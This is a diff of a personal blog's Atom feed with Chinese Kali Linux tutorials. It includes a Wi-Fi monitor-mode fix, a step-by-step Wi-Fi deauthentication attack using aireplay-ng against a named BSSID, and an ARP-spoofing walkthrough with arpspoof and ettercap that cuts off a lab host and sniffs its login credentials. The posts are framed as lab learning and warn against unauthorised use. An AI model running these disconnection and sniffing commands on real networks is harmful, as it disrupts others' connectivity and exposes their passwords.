@@ -6,7 +6,7 @@
   <link href="https://lxttz.github.io/atom.xml" rel="self"/>
   
   <link href="https://lxttz.github.io/"/>
-  <updated>2025-09-15T01:39:40.651Z</updated>
+  <updated>2025-09-19T08:53:03.601Z</updated>
   <id>https://lxttz.github.io/</id>
   
   <author>
@@ -17,13 +17,40 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>最新kali关于无线网卡监听失败扫描不到wifi的解决方法</title>
+    <link href="https://lxttz.github.io/posts/d6514208.html"/>
+    <id>https://lxttz.github.io/posts/d6514208.html</id>
+    <published>2025-09-19T08:50:50.000Z</published>
+    <updated>2025-09-19T08:53:03.601Z</updated>
+    
+    <content type="html"><![CDATA[<h1>方法一:</h1><p>将网卡拔掉换个插口，重启物理主机并重启虚拟机！</p><h1>方法二：</h1><p>输入命令检查进程并杀掉进程。</p><p>airmon-ng check<br>AI写代码<br>plaintext<br>airmon-ng check kill<br>AI写代码<br>plaintext</p><h1>方法三：</h1><p>需要执行命令先卸载网卡，再重新挂载，按顺序执行下面三条代码。</p><p>ifconfig wlan0 down<br>iwconfig wlan0 mode monitor<br>ifconfig wlan0 up<br>AI写代码<br>plaintext</p><h1>方法四：</h1><p>此网卡就是wlan0，不是wlan0mon。也不需要用airmon-ng start 命令启用监听模式，airodump-ng命令会自动处理开启监听。</p><p>sudo airodump-ng wlan0<br>————————————————</p><p>原文链接：<a href="https://blog.csdn.net/weixin_74711824/article/details/128839356">https://blog.csdn.net/weixin_74711824/article/details/128839356</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1&gt;方法一:&lt;/h1&gt;
+&lt;p&gt;将网卡拔掉换个插口，重启物理主机并重启虚拟机！&lt;/p&gt;
+&lt;h1&gt;方法二：&lt;/h1&gt;
+&lt;p&gt;输入命令检查进程并杀掉进程。&lt;/p&gt;
+&lt;p&gt;airmon-ng check&lt;br&gt;
+AI写代码&lt;br&gt;
+plaintext&lt;br&gt;
+airmon-ng ch</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
     <title>kaliWIFI断网攻击</title>
     <link href="https://lxttz.github.io/posts/74e17bb7.html"/>
     <id>https://lxttz.github.io/posts/74e17bb7.html</id>
     <published>2025-09-15T01:34:04.000Z</published>
-    <updated>2025-09-15T01:39:40.651Z</updated>
+    <updated>2025-09-19T11:01:13.674Z</updated>
     
-    <content type="html"><![CDATA[<p>1.准备免驱网卡，十几块钱嘎嘎板正</p><p>2.将网卡差在主机上（虚拟机需要选择连接在虚拟机上）主机会自动连接</p><p>3.检查网卡</p><p>sudo su</p><p>开启root模式 初始密码kali</p><p>ifconfig</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/d358ad04f61cf4aea530c167119787d1.png" alt="d358ad04f61cf4aea530c167119787d1"></p><p>检查网卡 出现wlan0即为成功</p><p>3开启网卡的监听模式</p><p>airmon-ng start wlan0</p><p>名词解释</p><p>Bssid –无线路由的Mac地址</p><p>Pwr –附近wifi信号的强度</p><p>#Data 捕获到的数据包</p><p>CH –无线路由的信道</p><p>ESSID wifi名称</p><p>如图</p><p>4.开启网卡进行扫描</p><p>airodump-ng wlan0mon</p><p>如图</p><p>CTRL+C停止扫描</p><p>4.开启监听</p><p>airodump-ng --bssid (上面扫描到的bssid数值) -c（CH数值）–write qyyy wlan0mon</p><p>5.开始装X</p><p>aireplay-ng -a(上方bssid数值) -0 500 wlan0mon</p><p>注：Ctrl+C停止攻击</p><p>不要攻击未经允许的wifi，违法的！</p><p>别还没学多少kali，牢饭就吃饱了❤️<br>版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。</p><p>原文链接：<a href="https://blog.csdn.net/maniubip/article/details/140434049">https://blog.csdn.net/maniubip/article/details/140434049</a></p>]]></content>
+    <content type="html"><![CDATA[<p>1.准备免驱网卡，十几块钱嘎嘎板正</p><p>2.将网卡差在主机上（虚拟机需要选择连接在虚拟机上）主机会自动连接</p><p>3.检查网卡</p><p>sudo su</p><p>开启root模式 初始密码kali</p><p>ifconfig</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/d358ad04f61cf4aea530c167119787d1.png" alt="d358ad04f61cf4aea530c167119787d1"></p><p>检查网卡 出现wlan0即为成功</p><p>3开启网卡的监听模式</p><p>airmon-ng start wlan0</p><p>名词解释</p><p>Bssid –无线路由的Mac地址</p><p>Pwr –附近wifi信号的强度</p><p>#Data 捕获到的数据包</p><p>CH –无线路由的信道</p><p>ESSID wifi名称</p><p>如图</p><p>4.开启网卡进行扫描</p><p>airodump-ng wlan0mon</p><p>如图</p><p>CTRL+C停止扫描</p><p>4.开启监听</p><p>airodump-ng --bssid (上面扫描到的bssid数值) -c（CH数值）–write qyyy wlan0mon</p><p>5.开始装X</p><p>aireplay-ng -a(上方bssid数值) -0 500 wlan0mon</p><p>注：Ctrl+C停止攻击</p><p>不要攻击未经允许的wifi，违法的！<br># 重新运行 airodump-ng，专注于频道 6 并观察目标 BSSID 是否存在<br>airodump-ng -c 6 wlan0mon</p><ol><li><p>命令 iwconfig wlan0mon channel 11<br>作用：将无线网卡（wlan0mon）强制锁定到频道 11<br>各部分含义：<br>iwconfig：Linux 系统中用于配置无线网卡参数的命令<br>wlan0mon：处于监控模式（monitor mode）的无线网卡接口名<br>channel 11：指定要锁定的频道为 11（与目标 WiFi 的频道一致）</p></li><li><p>命令 aireplay-ng -a 76:CE:C0:86:FC:EC  -0 500 wlan0mon<br>作用：向目标 WiFi 发送大量断开连接帧，使连接的设备暂时掉线<br>各参数含义：<br>aireplay-ng：用于无线数据包注入和攻击的工具<br>-a 52:AD:3E:6D:98:CC：指定目标 WiFi 的 BSSID（MAC 地址）<br>-0 500：表示发起 Deauthentication 攻击（-0是攻击模式），发送 500 个断开帧<br>wlan0mon：使用该监控模式网卡进行攻击</p></li></ol><p>{<br>airodump-ng --essid “oppo a6” wlan0mon    扫面固定的wifi名<br>}<br>别还没学多少kali，牢饭就吃饱了❤️<br>版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。</p><p>原文链接：<a href="https://blog.csdn.net/maniubip/article/details/140434049">https://blog.csdn.net/maniubip/article/details/140434049</a></p>]]></content>
     
     
     <summary type="html">kaliWIFI断网攻击</summary>
@@ -42,7 +69,7 @@
     <link href="https://lxttz.github.io/posts/a84b06da.html"/>
     <id>https://lxttz.github.io/posts/a84b06da.html</id>
     <published>2025-09-15T01:27:22.000Z</published>
-    <updated>2025-09-15T01:32:46.972Z</updated>
+    <updated>2025-09-15T01:40:07.808Z</updated>
     
     <content type="html"><![CDATA[<p>【网络安全】Kali ARP断网攻击与流量监听</p><p>目的：<br>如何借助Kali Linux系统内置的nmap、arpspoof、ettercap等渗透测试工具对局域网内同个网段的PC主机进行ARP欺骗和流量监听，实现断网攻击、密码窃取等</p><p>工具：<br>工具    说明<br>nmap    网络扫描工具，用于扫描局域网存活设备和开放端口与对应开启的服务<br>arpspoof    ARP欺骗工具，可毒化受害者ARP缓存，将网关MAC地址替换为攻击者MAC<br>ettercap    网络抓包工具，利用ARP协议的缺陷进行中间人攻击，嗅探局域网数据流量<br>实验环境：<br>主机    IP地址<br>Kali Linux    192.168.2.208<br>Win11物理机    192.168.2.223<br>备注：Kali Linux虚拟机使用桥接模式与Win11物理机处于同一局域网下</p><p>🚀ARP欺骗原理<br>1、ARP协议<br>​ 地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP/IP协议。主机发送信息时将包含目标IP地址的ARP请求广播到局域网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。地址解析协议是建立在网络中各个主机互相信任的基础上的，局域网络上的主机可以自主发送ARP应答消息，其他主机收到应答报文时不会检测该报文的真实性就会将其记入本机ARP缓存。</p><p>2、ARP工作过程<br>​ 假设主机A和B在同一个网段，主机A要向主机B发送信息，具体的地址解析过程如下：</p><p>主机A首先查看自己的ARP缓存表，确定其中是否包含有主机B对应的ARP表项。如果找到了对应的MAC地址，则主机A直接利用ARP表中的MAC地址，对IP数据包进行帧封装，并将数据包发送给主机B。<br>如果主机A在ARP表中找不到对应的MAC地址，则将缓存该数据报文，然后以广播方式发送一个ARP请求报文。ARP请求报文中的发送端IP地址和发送端MAC地址为主机A的IP地址和MAC地址，目标IP地址和目标MAC地址为主机B的IP地址和全0的MAC地址。由于ARP请求报文以广播方式发送，该网段上的所有主机都可以接收到该请求，但只有被请求的主机（即主机B）会对该请求进行处理。<br>主机B比较自己的IP地址和ARP请求报文中的目标IP地址，当两者相同时进行如下处理：将ARP请求报文中的发送端（即主机A）的IP地址和MAC地址存入自己的ARP表中。之后以单播方式发送ARP响应报文给主机A，其中包含了自己的MAC地址。<br>主机A收到ARP响应报文后，将主机B的MAC地址加入到自己的ARP表中以用于后续报文的转发，同时将IP数据包进行封装后发送出去。<br>​ 当主机A和主机B不在同一网段时，主机A就会先向网关发出ARP请求，ARP请求报文中的目标IP地址为网关的IP地址。当主机A从收到的响应报文中获得网关的MAC地址后，将报文封装并发给网关。如果网关没有主机B的ARP表项，网关会广播ARP请求，目标IP地址为主机B的IP地址，当网关从收到的响应报文中获得主机B的MAC地址后，就可以将报文发给主机B；如果网关已经有主机B的ARP表项，网关直接把报文发给主机B。</p><p>3、ARP欺骗<br>​ 地址解析协议是建立在网络中各个主机互相信任的基础上的，局域网络上的主机可以自主发送ARP应答消息，其他主机收到应答报文时不会检测该报文的真实性就会将其记入本机ARP缓存；由此攻击者就可以向某一主机发送伪ARP应答报文，使其发送的信息无法到达预期的主机或到达错误的主机，这就构成了一个ARP欺骗。</p><p>​ 由于ARP缓存表不是实时更新的，如果在网络中产生大量的ARP通信量，攻击者只要持续不断的发出伪造的ARP响应包就能更改目标主机ARP缓存中的IP-MAC条目，造成网络中断或中间人攻击。</p><p>一、断网攻击<br>1、设置Kali虚拟机网络为桥接模式并查看ip地址和网关<br>#ifconfig</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/2f8313dec37e4d0516ca4d98d35e22a7.png" alt="请添加图片描述"></p><p>#route -n</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/442b42b0eedcc696f4ed5a23abc74eb9.png" alt="请添加图片描述"></p><p>2、使用nmap扫描局域网存活主机与信息<br>#nmap -sP 192.168.2.0/24</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/776902703b03883860c3f31ab4f060ea.png" alt="https://i-blog.csdnimg.cn/blog_migrate/442b42b0eedcc696f4ed5a23abc74eb9.png"></p><p>3、运行arpspoof工具实现ARP断网攻击<br>#arpspoof -i eth0 -t 192.168.2.223(目标IP) 192.168.2.1(网关IP)</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/61572ce4bdf7290dca7f169a413769f2.png" alt="请添加图片描述"></p><p>4、结果<br>未攻击前正常上网</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/50926bcde13cc39596733ab52cfedb9d.png" alt="请添加图片描述"></p><p>攻击开始后win11主机无法上网</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/d97ac37f0e5b3a727dcea70e1fecc794.png" alt="请添加图片描述"></p><p>关闭攻击后网络恢复</p><p>二、流量监听<br>1、修改端口转发配置<br>1）临时修改<br>a）修改参数<br>#sysctl -w net.ipv4.ip_forward=1</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/c58afd3ad9bf8af241059027d76d64fc.png" alt="请添加图片描述"></p><p>b）更新系统配置<br>sysctl -p</p><p>2）永久修改<br>a）使用vim修改/etc/sysctl.conf配置文件<br>#vim /etc/sysctl.conf</p><p>b）添加修改内容<br>net.ipv4.ip_forward=1 #开机端口转发功能<br>AI写代码<br>c）更新系统配置<br>#sysctl -p</p><p>2、运行arpspoof攻击，实现流量转发代理<br>#arpspoof -i eth0 -t 192.168.2.1(网关IP) 192.168.2.223(目标IP)</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/208b18402d64e06fcb1185a9bfe93f78.png" alt="请添加图片描述"></p><p>win11靶机联网正常，端口转发成功</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/0bd5dc6b82fe3b36840d071b5d75c65b.png" alt="请添加图片描述"></p><p>3、ettercap窃听数据</p><p>注：需开启新的终端</p><p>1）开始窃听<br>#ettercap -Tq -i eth0</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/42c7920bcee1f2a946699b2a8515eb3b.png" alt="请添加图片描述"></p><p>2）靶机win11上打开一个网站，并且输入账号密码进行登录</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/317193176130842fb4dc8fe7f40280d1.png" alt="请添加图片描述"></p><p>3）成功窃听到对应靶机发出的请求数据</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/03d04d5650bcda0abbf69d7a099cc0d8.png" alt="请添加图片描述"></p><p>4）ettercap用法<br>选项    描述<br>-l    显示可用网卡接口设备<br>-i    选择接口<br>-t    协议选择，tcp/udp/all，默认all<br>-p    不进行毒化攻击，用于嗅探本地数据包<br>-L    载入过滤器文件<br>-V    text 将数据包以文本形式显示在屏幕上<br>-L    filename 把所有的数据包保存下来（保存后的文件只能用etterlog显示）<br>版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。</p><p>原文链接：<a href="https://blog.csdn.net/2301_77472496/article/details/147306247">https://blog.csdn.net/2301_77472496/article/details/147306247</a></p>]]></content>
     
@@ -429,29 +456,6 @@
     
     
     <category term="若依前后端分离笔记02" scheme="https://lxttz.github.io/tags/%E8%8B%A5%E4%BE%9D%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E7%AC%94%E8%AE%B002/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>若依前后端分离笔记01</title>
-    <link href="https://lxttz.github.io/posts/11ad3b33.html"/>
-    <id>https://lxttz.github.io/posts/11ad3b33.html</id>
-    <published>2025-04-14T07:05:59.000Z</published>
-    <updated>2025-04-14T07:35:34.325Z</updated>
-    
-    <content type="html"><![CDATA[<h1>1,登录界面</h1><p>友情链接;<a href="https://www.bilibili.com/video/BV1HT4y1d7oA?spm_id_from=333.788.videopod.episodes&amp;vd_source=1a2ba67b8224ba6daa0aff71044d4787&amp;p=2">2、验证码的前端实现_哔哩哔哩_bilibili</a></p><h2 id="1-1生成验证码">1.1生成验证码</h2><h3 id="（1）基本思路：">（1）基本思路：</h3><p>后端生成一个表达式：</p><p>列如1+1=2</p><p>1+1=？@2</p><p>（1）1+1=？转成图片，传到前端进行展示</p><p>（2）把答案存入Reids 中，key存在前端</p><h3 id="（2）代码实现：">（2）代码实现：</h3><p>前端页面：A:\卓面\ruoyi\RuoYi-Vue\ruoyi-ui\src\views      都在views文件中</p><p>登录前端页面（login.vue）：A:\卓面\ruoyi\RuoYi-Vue\ruoyi-ui\src\views\login.vue</p><p>login.vue107行代码：</p><p>created() {</p><p>this.getCode();       //方法</p><p>this.getCookie();</p><p>},</p><p>methods: {</p><p>getCode() {</p><p>getCodeImg().then(res =&gt; {</p><p>this.captchaEnabled = res.captchaEnabled === undefined ? true : res.captchaEnabled;</p><p>if (this.captchaEnabled) {</p><p>this.codeUrl = “data:image/gif;base64,” + res.img;        //图片</p><p>this.loginForm.uuid = res.uuid;      //res存储</p><p>}</p><p>});</p><p>},</p><p>login.vue的api接口路径</p><p>A:\卓面\ruoyi\RuoYi-Vue\ruoyi-ui\src\api\login.js<br><img src="../../themes/butterfly/source/img/Snipaste_2025-04-14_15-29-02.png" alt="alt text"></p><p>下一站：</p>]]></content>
-    
-    
-    <summary type="html">验证码的前端实现</summary>
-    
-    
-    
-    <category term="若依" scheme="https://lxttz.github.io/categories/%E8%8B%A5%E4%BE%9D/"/>
-    
-    <category term="验证码的前端实现" scheme="https://lxttz.github.io/categories/%E8%8B%A5%E4%BE%9D/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%9A%84%E5%89%8D%E7%AB%AF%E5%AE%9E%E7%8E%B0/"/>
-    
-    
-    <category term="验证码的前端实现" scheme="https://lxttz.github.io/tags/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%9A%84%E5%89%8D%E7%AB%AF%E5%AE%9E%E7%8E%B0/"/>
     
   </entry>
   
